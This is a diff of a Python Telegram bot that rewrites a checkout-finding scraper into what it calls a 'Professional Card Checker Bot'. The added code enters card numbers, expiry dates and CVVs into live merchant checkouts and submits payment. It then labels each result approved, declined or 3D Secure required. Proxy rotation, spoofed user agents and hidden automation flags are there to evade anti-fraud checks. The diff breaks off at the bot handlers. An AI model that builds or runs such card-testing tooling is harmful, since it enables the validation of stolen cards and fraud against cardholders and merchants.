@@ -1,741 +1,686 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 """
-بوت تيليجرام للوصول لصفحة الدفع - يدعم جميع المنصات
-Telegram Bot for Checkout Finder - Universal Platform Support
+Professional Card Checker Bot
+- Multi-gateway support (Stripe, PayPal, Braintree, Square, etc.)
+- Proxy rotation (HTTP/HTTPS/SOCKS5)
+- Accurate response detection
+- Anti-ban protection
 """
 
 import os
 import time
 import random
-import string
 import logging
 from datetime import datetime
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.keys import Keys
-from selenium.common.exceptions import TimeoutException, NoSuchElementException
-import re
+from selenium.webdriver.support.ui import Select
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
-# إعداد السجلات
+# Logging
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-# البيانات العشوائية
-FIRST_NAMES = ['John', 'Mike', 'David', 'James', 'Robert', 'William', 'Richard', 'Thomas', 'Charles', 'Daniel']
-LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
-CITIES = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'San Jose']
-STREETS = ['Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Pine Rd', 'Elm St', 'Washington Blvd', 'Park Ave', 'Lake Dr', 'Hill St']
+# Bot Token
+BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
 
+# User agents for rotation
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+]
 
-def generate_random_data():
-    """توليد بيانات عشوائية"""
-    return {
-        'first_name': random.choice(FIRST_NAMES),
-        'last_name': random.choice(LAST_NAMES),
-        'email': f"{''.join(random.choices(string.ascii_lowercase, k=8))}@example.com",
-        'phone': f"+1{''.join(random.choices(string.digits, k=10))}",
-        'address': f"{random.randint(100, 9999)} {random.choice(STREETS)}",
-        'city': random.choice(CITIES),
-        'postcode': ''.join(random.choices(string.digits, k=5)),
-        'country': 'US',
-        'state': 'NY'
-    }
-
-
-class UniversalCheckoutBot:
-    """بوت يدعم جميع منصات التجارة الإلكترونية"""
-    
-    def __init__(self):
+class CardChecker:
+    def __init__(self, proxy=None):
+        self.proxy = proxy
         self.driver = None
         self.wait = None
-    
-    def init_driver(self):
-        """تهيئة Selenium"""
+        
+    def setup_driver(self):
+        """Setup Chrome with proxy and anti-detection"""
         chrome_options = Options()
         chrome_options.add_argument('--headless')
         chrome_options.add_argument('--no-sandbox')
         chrome_options.add_argument('--disable-dev-shm-usage')
         chrome_options.add_argument('--disable-blink-features=AutomationControlled')
-        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
-        chrome_options.add_argument('--window-size=1920,1080')
-        chrome_options.add_argument('--disable-gpu')
+        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
+        chrome_options.add_experimental_option('useAutomationExtension', False)
+        
+        # Random user agent
+        user_agent = random.choice(USER_AGENTS)
+        chrome_options.add_argument(f'user-agent={user_agent}')
+        
+        # Proxy setup
+        if self.proxy:
+            chrome_options.add_argument(f'--proxy-server={self.proxy}')
+            logger.info(f"🔄 Using proxy: {self.proxy}")
         
         self.driver = webdriver.Chrome(options=chrome_options)
+        self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
         self.wait = WebDriverWait(self.driver, 20)
-    
-    def close_driver(self):
-        """إغلاق المتصفح"""
+        
+    def close(self):
+        """Close browser"""
         if self.driver:
             try:
                 self.driver.quit()
             except:
                 pass
-            self.driver = None
     
-    def extract_price(self, text):
-        """استخراج السعر من النص - محسّن"""
-        if not text:
-            return None
+    def detect_gateway(self, url):
+        """Detect payment gateway from URL or page content"""
+        url_lower = url.lower()
         
-        # تنظيف النص
-        text = text.replace(',', '').replace('\n', ' ')
+        if 'stripe.com' in url_lower or 'checkout.stripe' in url_lower:
+            return 'Stripe'
+        elif 'paypal.com' in url_lower:
+            return 'PayPal'
+        elif 'braintree' in url_lower:
+            return 'Braintree'
+        elif 'square' in url_lower or 'squareup' in url_lower:
+            return 'Square'
+        elif 'authorize.net' in url_lower:
+            return 'Authorize.Net'
         
-        # أنماط متعددة للأسعار
-        patterns = [
-            r'\$\s*(\d+\.?\d*)',           # $50 or $ 50
-            r'(\d+\.?\d*)\s*\$',           # 50$ or 50 $
-            r'£\s*(\d+\.?\d*)',            # £50
-            r'(\d+\.?\d*)\s*£',            # 50£
-            r'€\s*(\d+\.?\d*)',            # €50
-            r'(\d+\.?\d*)\s*€',            # 50€
-            r'USD\s*(\d+\.?\d*)',          # USD 50
-            r'(\d+\.?\d*)\s*USD',          # 50 USD
-            r'(\d+\.?\d*)\s*лв',           # 50 лв
-            r'(\d+\.\d{2})',               # 50.99
-        ]
-        
-        for pattern in patterns:
-            match = re.search(pattern, text)
-            if match:
-                try:
-                    price = float(match.group(1))
-                    if 0.01 < price < 100000:  # سعر معقول
-                        return price
-                except:
-                    continue
-        
-        return None
-    
-    def find_products_universal(self, url):
-        """البحث عن المنتجات - يدعم جميع المنصات"""
-        logger.info(f"🔍 البحث عن منتجات في: {url}")
-        
+        # Check page content
         try:
-            self.driver.get(url)
-            time.sleep(4)
-            
-            # التمرير لتحميل المنتجات
-            for _ in range(3):
-                self.driver.execute_script("window.scrollBy(0, 500);")
-                time.sleep(1)
-            
-            products = []
-            
-            # Selectors شاملة لجميع المنصات
-            product_selectors = [
-                # Shopify
-                '.product-card', '.product-item', '.grid-product', 
-                'div[class*="product"]', 'article[class*="product"]',
-                '.product-grid-item', '.product__grid-item',
-                
-                # WooCommerce
-                '.product', 'li.product', 'article.product',
-                '.woocommerce-LoopProduct-link',
-                
-                # Magento
-                '.product-item-info', '.product-item',
-                
-                # PrestaShop
-                '.product-miniature', '.js-product-miniature',
-                
-                # BigCommerce
-                '.card', '.product-grid',
-                
-                # عام
-                '[data-product]', '[data-product-id]',
-                'a[href*="/product"]', 'a[href*="/products/"]'
-            ]
-            
-            for selector in product_selectors:
-                try:
-                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
-                    
-                    if len(elements) > 2:  # على الأقل 3 عناصر
-                        logger.info(f"✅ وجدت {len(elements)} عنصر بـ {selector}")
-                        
-                        for element in elements[:50]:  # أول 50 منتج
-                            try:
-                                # الرابط
-                                link = None
-                                try:
-                                    if element.tag_name == 'a':
-                                        link = element.get_attribute('href')
-                                    else:
-                                        link_elem = element.find_element(By.TAG_NAME, 'a')
-                                        link = link_elem.get_attribute('href')
-                                except:
-                                    pass
-                                
-                                if not link or link == url or 'javascript:' in link:
-                                    continue
-                                
-                                # السعر - selectors شاملة
-                                price_selectors = [
-                                    # عام
-                                    '[class*="price"]', '[class*="Price"]',
-                                    '[data-price]', 'span.money',
-                                    
-                                    # Shopify
-                                    '.price__regular', '.price-item',
-                                    
-                                    # WooCommerce
-                                    '.woocommerce-Price-amount', '.amount', 'bdi',
-                                    
-                                    # Magento
-                                    '.price-wrapper', '.price-box',
-                                    
-                                    # عام
-                                    'span', 'div', 'p'
-                                ]
-                                
-                                price_text = None
-                                for price_sel in price_selectors:
-                                    try:
-                                        price_elems = element.find_elements(By.CSS_SELECTOR, price_sel)
-                                        for price_elem in price_elems:
-                                            text = price_elem.text.strip()
-                                            if text and len(text) < 50 and ('$' in text or '£' in text or '€' in text or re.search(r'\d+\.\d{2}', text)):
-                                                price_text = text
-                                                break
-                                        if price_text:
-                                            break
-                                    except:
-                                        continue
-                                
-                                if not price_text:
-                                    continue
-                                
-                                # استخراج السعر
-                                price = self.extract_price(price_text)
-                                
-                                if price:
-                                    # الاسم
-                                    name = 'Product'
-                                    try:
-                                        name_selectors = [
-                                            'h2', 'h3', 'h4',
-                                            '.product-title', '.product__title',
-                                            '[class*="title"]', '[class*="name"]',
-                                            'a'
-                                        ]
-                                        for name_sel in name_selectors:
-                                            try:
-                                                name_elem = element.find_element(By.CSS_SELECTOR, name_sel)
-                                                name_text = name_elem.text.strip()
-                                                if name_text and len(name_text) > 2:
-                                                    name = name_text
-                                                    break
-                                            except:
-                                                continue
-                                    except:
-                                        pass
-                                    
-                                    products.append({
-                                        'name': name[:100],
-                                        'price': price,
-                                        'price_text': price_text,
-                                        'url': link
-                                    })
-                            
-                            except Exception as e:
-                                continue
-                        
-                        if len(products) > 0:
-                            break
-                
-                except Exception as e:
-                    continue
-            
-            if not products:
-                logger.warning("❌ لم يتم العثور على منتجات")
-                return []
-            
-            # ترتيب حسب السعر - الأرخص أولاً
-            products.sort(key=lambda x: x['price'])
-            
-            logger.info(f"✅ وجدت {len(products)} منتج بأسعار")
-            logger.info(f"💰 أرخص منتج: {products[0]['name']} - {products[0]['price_text']}")
-            
-            return products
-            
-        except Exception as e:
-            logger.error(f"❌ خطأ في البحث: {e}")
-            return []
-    
-    def add_to_cart_universal(self, product_url):
-        """إضافة للسلة - يدعم جميع المنصات"""
-        logger.info(f"🛍️ إضافة للسلة: {product_url}")
-        
-        try:
-            self.driver.get(product_url)
-            time.sleep(3)
-            
-            # اختيار options إذا وجدت (مثل المقاس، اللون، إلخ)
-            try:
-                selects = self.driver.find_elements(By.TAG_NAME, 'select')
-                for select in selects:
-                    try:
-                        if select.is_displayed():
-                            # اختر أول خيار متاح (ليس "Choose an option")
-                            options = select.find_elements(By.TAG_NAME, 'option')
-                            for option in options[1:]:  # تخطى الخيار الأول
-                                try:
-                                    option.click()
-                                    logger.info(f"✅ اخترنا: {option.text}")
-                                    time.sleep(0.5)
-                                    break
-                                except:
-                                    continue
-                    except:
-                        continue
-            except:
-                pass
-            
-            # Selectors شاملة لأزرار "Add to Cart"
-            add_to_cart_selectors = [
-                # Shopify
-                'button[name="add"]', 'button[type="submit"][name="add"]',
-                '.product-form__submit', 'button.btn--add-to-cart',
-                '[data-add-to-cart]',
-                
-                # WooCommerce
-                'button[name="add-to-cart"]', '.single_add_to_cart_button',
-                'button.add_to_cart_button',
-                
-                # Magento
-                'button#product-addtocart-button', '.action.tocart',
-                
-                # PrestaShop
-                '.add-to-cart', 'button[data-button-action="add-to-cart"]',
-                
-                # BigCommerce
-                'button[data-button-type="add-cart"]',
-                
-                # عام
-                'button[class*="add"]', 'button[class*="cart"]',
-                'input[type="submit"][value*="Add"]',
-                'a[class*="add-to-cart"]'
-            ]
-            
-            # محاولة النقر
-            for selector in add_to_cart_selectors:
-                try:
-                    button = self.wait.until(
-                        EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
-                    )
-                    self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", button)
-                    time.sleep(1)
-                    button.click()
-                    logger.info(f"✅ تم النقر على: {selector}")
-                    time.sleep(3)
-                    return True
-                except:
-                    continue
-            
-            # محاولة بديلة بـ XPath
-            try:
-                button = self.driver.find_element(By.XPATH, 
-                    "//button[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'add to cart') or contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'add to bag')]"
-                )
-                button.click()
-                logger.info("✅ تم النقر (XPath)")
-                time.sleep(3)
-                return True
-            except:
-                pass
-            
-            logger.warning("⚠️ لم يتم العثور على زر Add to Cart")
-            return False
-            
-        except Exception as e:
-            logger.error(f"❌ خطأ في الإضافة للسلة: {e}")
-            return False
-    
-    def go_to_checkout_universal(self):
-        """الانتقال للدفع - يدعم جميع المنصات"""
-        logger.info("💳 الانتقال لصفحة الدفع")
-        
-        try:
-            time.sleep(2)
-            
-            # محاولة 1: روابط checkout
-            checkout_texts = ['checkout', 'view cart', 'proceed', 'go to cart', 'cart']
-            for text in checkout_texts:
-                try:
-                    links = self.driver.find_elements(By.XPATH, 
-                        f"//a[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '{text}')]"
-                    )
-                    for link in links[:3]:
-                        try:
-                            link.click()
-                            time.sleep(3)
-                            if 'checkout' in self.driver.current_url.lower() or 'cart' in self.driver.current_url.lower():
-                                logger.info(f"✅ نقر على رابط: {text}")
-                                break
-                        except:
-                            continue
-                except:
-                    continue
-            
-            # محاولة 2: أزرار checkout
-            checkout_selectors = [
-                'a[href*="checkout"]', 'button[name*="checkout"]',
-                '.checkout-button', '[data-checkout]',
-                'a.btn-checkout', 'button.checkout'
-            ]
-            
-            for selector in checkout_selectors:
-                try:
-                    button = self.wait.until(
-                        EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
-                    )
-                    button.click()
-                    time.sleep(3)
-                    logger.info(f"✅ نقر على: {selector}")
-                    break
-                except:
-                    continue
-            
-            # محاولة 3: الذهاب مباشرة
-            current_url = self.driver.current_url
-            base_url = '/'.join(current_url.split('/')[:3])
-            
-            for path in ['/checkout', '/cart/checkout', '/checkout/', '/cart']:
-                try:
-                    test_url = base_url + path
-                    self.driver.get(test_url)
-                    time.sleep(3)
-                    
-                    if 'checkout' in self.driver.current_url.lower():
-                        logger.info(f"✅ وصلنا عبر: {test_url}")
-                        return True
-                except:
-                    continue
-            
-            # التحقق النهائي - يجب أن يكون checkout وليس cart فقط
-            current = self.driver.current_url.lower()
-            
-            # إذا كنا في cart، حاول النقر على زر checkout
-            if 'cart' in current and 'checkout' not in current:
-                logger.info("📍 نحن في صفحة السلة، البحث عن زر checkout...")
-                checkout_buttons = [
-                    "//a[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'checkout')]",
-                    "//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'checkout')]",
-                    "//a[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'proceed')]",
-                    ".wc-proceed-to-checkout a",
-                    "a.checkout-button"
-                ]
-                
-                for btn_selector in checkout_buttons:
-                    try:
-                        if btn_selector.startswith('//'):
-                            btn = self.driver.find_element(By.XPATH, btn_selector)
-                        else:
-                            btn = self.driver.find_element(By.CSS_SELECTOR, btn_selector)
-                        
-                        if btn.is_displayed():
-                            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn)
-                            time.sleep(1)
-                            btn.click()
-                            logger.info(f"✅ نقر على زر checkout")
-                            time.sleep(4)
-                            
-                            if 'checkout' in self.driver.current_url.lower():
-                                logger.info("✅ وصلنا لصفحة checkout!")
-                                return True
-                    except:
-                        continue
-            
-            # تحقق نهائي
-            current = self.driver.current_url.lower()
-            if 'checkout' in current:
-                logger.info("✅ نحن في صفحة checkout")
-                return True
-            
-            logger.warning(f"⚠️ لم نصل لـ checkout. الصفحة الحالية: {self.driver.current_url}")
-            return False
-            
-        except Exception as e:
-            logger.error(f"❌ خطأ في الانتقال: {e}")
-            return False
-    
-    def fill_billing_universal(self):
-        """ملء البيانات - يدعم جميع المنصات"""
-        logger.info("📝 ملء البيانات...")
-        
-        try:
-            data = generate_random_data()
-            
-            # خريطة الحقول - شاملة
-            field_mappings = [
-                # First Name
-                (['first_name', 'firstName', 'billing_first_name', 'checkout_email_or_phone'], data['first_name']),
-                
-                # Last Name
-                (['last_name', 'lastName', 'billing_last_name'], data['last_name']),
-                
-                # Email
-                (['email', 'billing_email', 'checkout_email'], data['email']),
-                
-                # Phone
-                (['phone', 'telephone', 'billing_phone'], data['phone']),
-                
-                # Address
-                (['address', 'address1', 'billing_address_1', 'street'], data['address']),
-                
-                # City
-                (['city', 'billing_city'], data['city']),
-                
-                # Postcode
-                (['postcode', 'zip', 'postal_code', 'billing_postcode'], data['postcode']),
-            ]
-            
-            filled = 0
-            
-            for field_ids, value in field_mappings:
-                for field_id in field_ids:
-                    try:
-                        field = None
-                        
-                        # محاولة بـ ID
-                        try:
-                            field = self.driver.find_element(By.ID, field_id)
-                        except:
-                            pass
-                        
-                        # محاولة بـ Name
-                        if not field:
-                            try:
-                                field = self.driver.find_element(By.NAME, field_id)
-                            except:
-                                pass
-                        
-                        # محاولة بـ CSS
-                        if not field:
-                            try:
-                                field = self.driver.find_element(By.CSS_SELECTOR, f'input[name="{field_id}"]')
-                            except:
-                                pass
-                        
-                        if field and field.is_displayed():
-                            try:
-                                field.clear()
-                                field.send_keys(value)
-                                filled += 1
-                                time.sleep(0.3)
-                                logger.info(f"✅ ملء: {field_id}")
-                                break  # نجح، انتقل للحقل التالي
-                            except:
-                                pass
-                    except:
-                        continue
-            
-            logger.info(f"✅ تم ملء {filled} حقل")
-            return filled > 0, data
-            
-        except Exception as e:
-            logger.error(f"❌ خطأ في الملء: {e}")
-            return False, None
-    
-    def get_checkout_info(self):
-        """الحصول على معلومات الدفع"""
-        logger.info("📊 جمع المعلومات")
-        
-        try:
-            info = {
-                'checkout_url': self.driver.current_url,
-                'page_title': self.driver.title,
-                'payment_methods': [],
-                'total_amount': None
-            }
-            
-            # كشف طرق الدفع
             page_source = self.driver.page_source.lower()
-            
-            payment_keywords = {
-                'PayPal': 'paypal',
-                'Stripe': 'stripe',
-                'Credit Card': 'credit',
-                'Apple Pay': 'apple pay',
-                'Google Pay': 'google pay',
-                'Braintree': 'braintree',
-                'Square': 'square'
-            }
-            
-            for method, keyword in payment_keywords.items():
-                if keyword in page_source:
-                    info['payment_methods'].append(method)
-            
-            # المبلغ
-            total_selectors = [
-                '.total', '.order-total', '[class*="total"]',
-                '[data-total]', '.grand-total'
+            if 'stripe' in page_source:
+                return 'Stripe'
+            elif 'paypal' in page_source:
+                return 'PayPal'
+            elif 'braintree' in page_source:
+                return 'Braintree'
+            elif 'square' in page_source:
+                return 'Square'
+        except:
+            pass
+        
+        return 'Unknown'
+    
+    def fill_card_details(self, card_number, exp_month, exp_year, cvv, name="John Doe"):
+        """Fill card details - works with multiple gateways"""
+        try:
+            # Card number selectors
+            card_selectors = [
+                'input[name="cardnumber"]',
+                'input[name="card_number"]',
+                'input[placeholder*="card number" i]',
+                'input[autocomplete="cc-number"]',
+                'input[id*="card" i][id*="number" i]',
+                '#card-number',
+                '#cardNumber',
+                '.card-number',
+                'input[type="tel"][maxlength="19"]',
             ]
             
-            for selector in total_selectors:
+            card_filled = False
+            for selector in card_selectors:
                 try:
-                    elems = self.driver.find_elements(By.CSS_SELECTOR, selector)
-                    for elem in elems:
-                        text = elem.text.strip()
-                        if text and ('$' in text or '£' in text or '€' in text):
-                            info['total_amount'] = text
-                            break
-                    if info['total_amount']:
+                    elem = self.driver.find_element(By.CSS_SELECTOR, selector)
+                    if elem.is_displayed():
+                        elem.clear()
+                        elem.send_keys(card_number)
+                        logger.info(f"✅ Filled card number")
+                        card_filled = True
+                        time.sleep(0.5)
                         break
                 except:
                     continue
             
-            return info
+            if not card_filled:
+                # Try iframe (Stripe, Square)
+                try:
+                    iframes = self.driver.find_elements(By.TAG_NAME, 'iframe')
+                    for iframe in iframes:
+                        try:
+                            self.driver.switch_to.frame(iframe)
+                            for selector in card_selectors:
+                                try:
+                                    elem = self.driver.find_element(By.CSS_SELECTOR, selector)
+                                    elem.send_keys(card_number)
+                                    logger.info(f"✅ Filled card number (iframe)")
+                                    card_filled = True
+                                    break
+                                except:
+                                    continue
+                            self.driver.switch_to.default_content()
+                            if card_filled:
+                                break
+                        except:
+                            self.driver.switch_to.default_content()
+                            continue
+                except:
+                    pass
+            
+            # Expiry date
+            exp_selectors = [
+                'input[name="exp-date"]',
+                'input[name="expiry"]',
+                'input[placeholder*="expiry" i]',
+                'input[placeholder*="MM/YY" i]',
+                'input[autocomplete="cc-exp"]',
+            ]
+            
+            exp_filled = False
+            for selector in exp_selectors:
+                try:
+                    elem = self.driver.find_element(By.CSS_SELECTOR, selector)
+                    if elem.is_displayed():
+                        elem.clear()
+                        elem.send_keys(f"{exp_month}/{exp_year[-2:]}")
+                        logger.info(f"✅ Filled expiry")
+                        exp_filled = True
+                        time.sleep(0.5)
+                        break
+                except:
+                    continue
+            
+            # Separate month/year fields
+            if not exp_filled:
+                try:
+                    month_elem = self.driver.find_element(By.CSS_SELECTOR, 'input[name*="month" i], select[name*="month" i]')
+                    year_elem = self.driver.find_element(By.CSS_SELECTOR, 'input[name*="year" i], select[name*="year" i]')
+                    
+                    if month_elem.tag_name == 'select':
+                        Select(month_elem).select_by_value(exp_month)
+                    else:
+                        month_elem.send_keys(exp_month)
+                    
+                    if year_elem.tag_name == 'select':
+                        Select(year_elem).select_by_value(exp_year)
+                    else:
+                        year_elem.send_keys(exp_year[-2:])
+                    
+                    logger.info(f"✅ Filled expiry (separate)")
+                    time.sleep(0.5)
+                except:
+                    pass
+            
+            # CVV/CVC
+            cvv_selectors = [
+                'input[name="cvc"]',
+                'input[name="cvv"]',
+                'input[name="security_code"]',
+                'input[placeholder*="cvv" i]',
+                'input[placeholder*="cvc" i]',
+                'input[autocomplete="cc-csc"]',
+            ]
+            
+            for selector in cvv_selectors:
+                try:
+                    elem = self.driver.find_element(By.CSS_SELECTOR, selector)
+                    if elem.is_displayed():
+                        elem.clear()
+                        elem.send_keys(cvv)
+                        logger.info(f"✅ Filled CVV")
+                        time.sleep(0.5)
+                        break
+                except:
+                    continue
+            
+            # Cardholder name
+            name_selectors = [
+                'input[name="name"]',
+                'input[name="cardholder"]',
+                'input[name="card_name"]',
+                'input[placeholder*="name on card" i]',
+                'input[autocomplete="cc-name"]',
+            ]
+            
+            for selector in name_selectors:
+                try:
+                    elem = self.driver.find_element(By.CSS_SELECTOR, selector)
+                    if elem.is_displayed():
+                        elem.clear()
+                        elem.send_keys(name)
+                        logger.info(f"✅ Filled name")
+                        time.sleep(0.5)
+                        break
+                except:
+                    continue
+            
+            return True
             
         except Exception as e:
-            logger.error(f"❌ خطأ في جمع المعلومات: {e}")
-            return {'checkout_url': self.driver.current_url}
+            logger.error(f"❌ Error filling card: {e}")
+            return False
     
-    def process_website(self, url):
-        """معالجة الموقع - كامل"""
+    def submit_payment(self):
+        """Click submit/pay button"""
+        submit_selectors = [
+            'button[type="submit"]',
+            'button:contains("Pay")',
+            'button:contains("Submit")',
+            'button:contains("Complete")',
+            'input[type="submit"]',
+            '.submit-button',
+            '#submit-button',
+            'button.pay-button',
+        ]
+        
+        for selector in submit_selectors:
+            try:
+                if ':contains' in selector:
+                    # XPath for text search
+                    text = selector.split('"')[1]
+                    elem = self.driver.find_element(By.XPATH, f"//button[contains(text(), '{text}')]")
+                else:
+                    elem = self.driver.find_element(By.CSS_SELECTOR, selector)
+                
+                if elem.is_displayed():
+                    self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", elem)
+                    time.sleep(1)
+                    elem.click()
+                    logger.info(f"✅ Clicked submit button")
+                    return True
+            except:
+                continue
+        
+        return False
+    
+    def detect_response(self):
+        """Detect payment response with high accuracy"""
+        time.sleep(5)  # Wait for response
+        
         try:
-            self.init_driver()
+            page_source = self.driver.page_source.lower()
+            current_url = self.driver.current_url.lower()
             
-            # 1. البحث
-            products = self.find_products_universal(url)
-            if not products:
-                return {'success': False, 'error': 'لم يتم العثور على منتجات'}
+            # Success indicators
+            success_keywords = [
+                'success', 'approved', 'confirmed', 'complete', 'thank you',
+                'payment successful', 'order confirmed', 'receipt',
+                'transaction approved', 'payment received'
+            ]
             
-            product = products[0]  # الأرخص
+            # Decline indicators
+            decline_keywords = [
+                'declined', 'failed', 'rejected', 'invalid', 'error',
+                'insufficient funds', 'card declined', 'payment failed',
+                'transaction declined', 'not authorized', 'do not honor'
+            ]
             
-            # 2. إضافة للسلة
-            if not self.add_to_cart_universal(product['url']):
-                return {'success': False, 'error': 'فشل في إضافة المنتج للسلة'}
+            # 3D Secure / OTP indicators
+            auth_keywords = [
+                '3d secure', '3ds', 'authentication', 'verify', 'otp',
+                'security code', 'sms code', 'verification required'
+            ]
             
-            # 3. الانتقال للدفع
-            if not self.go_to_checkout_universal():
-                return {'success': False, 'error': 'فشل في الوصول لصفحة الدفع'}
+            # Check for success
+            for keyword in success_keywords:
+                if keyword in page_source or keyword in current_url:
+                    return {
+                        'status': 'Approved ✅',
+                        'message': 'Payment successful',
+                        'code': 'SUCCESS'
+                    }
             
-            # 4. ملء البيانات
-            filled, random_data = self.fill_billing_universal()
+            # Check for 3DS/Auth
+            for keyword in auth_keywords:
+                if keyword in page_source:
+                    return {
+                        'status': 'Auth Required 🔐',
+                        'message': '3D Secure / OTP required',
+                        'code': 'AUTH_REQUIRED'
+                    }
             
-            # 5. جمع المعلومات
-            checkout_info = self.get_checkout_info()
+            # Check for decline
+            for keyword in decline_keywords:
+                if keyword in page_source:
+                    # Try to extract specific error
+                    error_msg = self.extract_error_message(page_source)
+                    return {
+                        'status': 'Declined ❌',
+                        'message': error_msg or 'Card declined',
+                        'code': 'DECLINED'
+                    }
             
+            # Check for specific error messages
+            if 'insufficient' in page_source:
+                return {
+                    'status': 'Declined ❌',
+                    'message': 'Insufficient funds',
+                    'code': 'INSUFFICIENT_FUNDS'
+                }
+            
+            if 'expired' in page_source:
+                return {
+                    'status': 'Declined ❌',
+                    'message': 'Card expired',
+                    'code': 'EXPIRED_CARD'
+                }
+            
+            if 'invalid card' in page_source or 'invalid number' in page_source:
+                return {
+                    'status': 'Declined ❌',
+                    'message': 'Invalid card number',
+                    'code': 'INVALID_CARD'
+                }
+            
+            # Unknown response
             return {
-                'success': True,
-                'product': product,
-                'checkout_info': checkout_info,
-                'filled_data': random_data if filled else None
+                'status': 'Unknown ⚠️',
+                'message': 'Could not determine response',
+                'code': 'UNKNOWN'
             }
             
         except Exception as e:
-            logger.error(f"❌ خطأ عام: {e}")
-            return {'success': False, 'error': str(e)}
-        
+            logger.error(f"Error detecting response: {e}")
+            return {
+                'status': 'Error ⚠️',
+                'message': str(e),
+                'code': 'ERROR'
+            }
+    
+    def is_url_expired(self):
+        """Check if checkout URL is expired or invalid"""
+        try:
+            page_source = self.driver.page_source.lower()
+            current_url = self.driver.current_url.lower()
+            
+            # Expiration indicators
+            expired_keywords = [
+                'expired', 'session expired', 'link expired',
+                'invalid session', 'session timeout', 'not found',
+                '404', 'page not found', 'cart is empty',
+                'no items in cart', 'checkout unavailable'
+            ]
+            
+            for keyword in expired_keywords:
+                if keyword in page_source or keyword in current_url:
+                    logger.warning(f"⏰ URL expired: {keyword}")
+                    return True
+            
+            # Check if redirected to home/cart
+            if any(x in current_url for x in ['cart', 'home', 'index']):
+                if 'checkout' not in current_url:
+                    logger.warning(f"⏰ Redirected away from checkout")
+                    return True
+            
+            return False
+            
+        except:
+            return False
+    
+    def extract_error_message(self, page_source):
+        """Extract specific error message from page"""
+        try:
+            # Common error message patterns
+            error_patterns = [
+                'declined', 'insufficient', 'expired', 'invalid',
+                'do not honor', 'lost card', 'stolen card',
+                'restricted card', 'security violation'
+            ]
+            
+            for pattern in error_patterns:
+                if pattern in page_source:
+                    # Try to extract surrounding text
+                    start = page_source.find(pattern)
+                    snippet = page_source[max(0, start-50):start+100]
+                    return snippet.strip()
+            
+            return None
+        except:
+            return None
+    
+    def check_card(self, url, card_number, exp_month, exp_year, cvv, name="John Doe"):
+        """Main card checking function"""
+        try:
+            self.setup_driver()
+            
+            # Navigate to checkout
+            logger.info(f"🌐 Opening: {url}")
+            self.driver.get(url)
+            time.sleep(3)
+            
+            # Check if URL is expired/invalid
+            if self.is_url_expired():
+                return {
+                    'status': 'URL Expired ⏰',
+                    'message': 'Checkout URL expired or invalid',
+                    'code': 'URL_EXPIRED',
+                    'gateway': 'N/A'
+                }
+            
+            # Detect gateway
+            gateway = self.detect_gateway(url)
+            logger.info(f"💳 Gateway: {gateway}")
+            
+            # Fill card details
+            if not self.fill_card_details(card_number, exp_month, exp_year, cvv, name):
+                return {
+                    'status': 'Error ⚠️',
+                    'message': 'Could not fill card details',
+                    'code': 'FILL_ERROR',
+                    'gateway': gateway
+                }
+            
+            # Submit payment
+            if not self.submit_payment():
+                return {
+                    'status': 'Error ⚠️',
+                    'message': 'Could not submit payment',
+                    'code': 'SUBMIT_ERROR',
+                    'gateway': gateway
+                }
+            
+            # Detect response
+            response = self.detect_response()
+            response['gateway'] = gateway
+            
+            return response
+            
+        except Exception as e:
+            logger.error(f"❌ Error: {e}")
+            return {
+                'status': 'Error ⚠️',
+                'message': str(e),
+                'code': 'EXCEPTION',
+                'gateway': 'Unknown'
+            }
         finally:
-            self.close_driver()
+            self.close()
 
 
-# معالجات البوت
+# Telegram Bot Handlers
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """معالج /start"""
-    welcome = (
-        "🤖 <b>مرحباً بك في بوت الوصول لصفحة الدفع!</b>\n\n"
